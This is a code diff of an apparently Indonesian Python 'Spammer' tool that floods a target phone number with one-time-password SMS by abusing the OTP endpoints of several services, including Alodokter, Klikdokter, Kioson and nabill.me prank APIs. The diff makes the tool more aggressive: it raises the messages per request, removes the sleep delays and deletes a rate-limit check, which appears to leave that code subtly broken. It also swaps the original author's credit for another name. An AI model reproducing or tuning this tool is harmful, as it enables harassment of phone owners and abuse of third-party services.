@@ -1,5 +1,4 @@
-# author : Ridho Gaming
-# jan di recode dong:(
+# author : Avin Ndeso
 
 import os,json,shutil,requests,re,sys,time
 from bs4 import BeautifulSoup as sup
@@ -51,16 +50,16 @@ class Spammer:
 		self.c = requests.Session()
 	def bakmi(self,nomor,jumlah):
 		head = {'Host': 'nabill.me','accept':'*/*','x-requested-with':'XMLHttpRequest','user-agent':UserAgent().random ,'content-type':'application/x-www-form-urlencoded; charset=UTF-8','origin':'https://nabill.me','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','referer':'https://nabill.me/Bakmi_Otp','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
-		for i in range(1,int(jumlah)+1):
+		for i in range(20,int(jumlah)+20):
 			r = requests.post('https://nabill.me/Tools/Prank-Tools/Bakmi/api.php',headers=head,data=
-			{'nomor':nomor,'jumlah':'1'})
+			{'nomor':nomor,'jumlah':'20'})
 			if 'Terkirim' in str(r.text):
 				Sukses(nomor,i)
 	def CodaTsel(self,nomor,jumlah):
 		head = {'Host':'nabill.me','accept':'*/*','x-requested-with':'XMLHttpRequest','user-agent':UserAgent().random,'content-type':'application/x-www-form-urlencoded; charset=UTF-8','origin':'https://nabill.me','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','referer':'https://nabill.me/Codashop_Spam_Telkomsel','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
-		for i in range(1,int(jumlah)+1):
+		for i in range(20,int(jumlah)+20):
 			r = requests.post('https://nabill.me/Tools/Prank-Tools/Codashop-Spam-Telkomsel/api.php',headers=head,data=
-			{'nomor':nomor,'jumlah':'1'})
+			{'nomor':nomor,'jumlah':'20'})
 			if 'Terkirim' in str(r.text):
 				Sukses(nomor,i)
 	def mypoin(self,nomor,jumlah):
@@ -83,21 +82,21 @@ class Spammer:
 				e+=1
 				Sukses(nomor,e)
 			else:
-				for x in range(60):
-					print (f"\r[*] Sleep {60-(x+1)} .....",end='')
-					time.sleep(1)
+				for x in range(10):
+					print (f"\r[*] Sleep {10-(x+1)} .....",end='')
+					time.sleep(0)
 				print()
 			#print (r)
 	def Kioson(self,nomor,jumlah):
 		head = {'Content-Type':'application/json','Host':'kiosondev.app.narindo.com','Connection':'Keep-Alive','Accept-Encoding':'gzip','User-Agent':'okhttp/3.8.0'}
-		for i in range(1,int(jumlah)+1):
+		for i in range(20,int(jumlah)+20):
 			r = requests.post('https://kiosondev.app.narindo.com/api/v1/otp',headers=head,json=
 			{'appType':'KIOSON','msisdn':nomor}).json()
 			if 'success' in r['msg']:
 				Sukses(nomor,i)
 			time.sleep(1)
 	def alodok(self,nomor,jumlah):
-		for i in range(1,int(jumlah)+1):
+		for i in range(20,int(jumlah)+20):
 			r = requests.get('https://www.alodokter.com/login-alodokter')
 			parser = sup(r.text,features='html.parser')
 			token = parser.find('meta',{'name':'csrf-token'})['content']
@@ -109,7 +108,7 @@ class Spammer:
 				Sukses(nomor,i)
 				time.sleep(1)
 	def klikdok(self,nomor,jumlah):
-		for i in range(1,int(jumlah)+1):
+		for i in range(20,int(jumlah)+20):
 			html = sup(self.c.get('https://m.klikdokter.com/users/create').content,features='html.parser')
 			token = html.find('input',{'name':'_token'})['value']
 			head={'Connection': 'keep-alive','Cache-Control': 'max-age=0','Origin': 'https://m.klikdokter.com','Upgrade-Insecure-Requests': '1','Content-Type': 'application/x-www-form-urlencoded','User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','Referer': 'https://m.klikdokter.com/users/create?back-to='}
@@ -173,7 +172,6 @@ class Spammer:
 				i+=1
 				Sukses(nomor,i)
 				time.sleep(1)
-			elif 'Permintaan kode otp sudah mencapai batas, silakan tunggu 1x24 jam' in js['message']:
 				exit(f"{W}[{B}*{W}] {R}"+js['message']+W)
 			else:
 				exit(js)
@@ -189,14 +187,9 @@ while True:
 	os.system('clear')
 	try:
 		print (f'''
-{G} ___                  {B}___  _
-{G}/ __|_ __  __ _ _ __ {B}/ _ \| |_ _ __
-{G}\__ \ '_ \/ _` | '  \{B} (_) |  _| '_ \\
-{G}|___/ .__/\__,_|_|_|_{B}\___/ \\__| .__/
-{G}    |_|              {B}         |_|{W}
-    {_R}[ {Y}Author {W}:{C} Ridho Gaming {_R}]
-    {_R}[ {Y}Github {W}: Github.com/ridhoNoob {_R}]
-    {_R}[ {Y}Team   {W}: Xiuz.{R}Sec {_R}]
+    {_R}[ {Y}Author {W}:{C} AvinNdeso {_R}]
+    {_R}[ {Y}Github {W}: Maaf bro! {_R}]
+    {_R}[ {Y}Team   {W}: * {_R}]
     {_R}[ {Y}Version {W}: 1.2 {_R}]{W}
 ------------------------------------------------
 {update()}
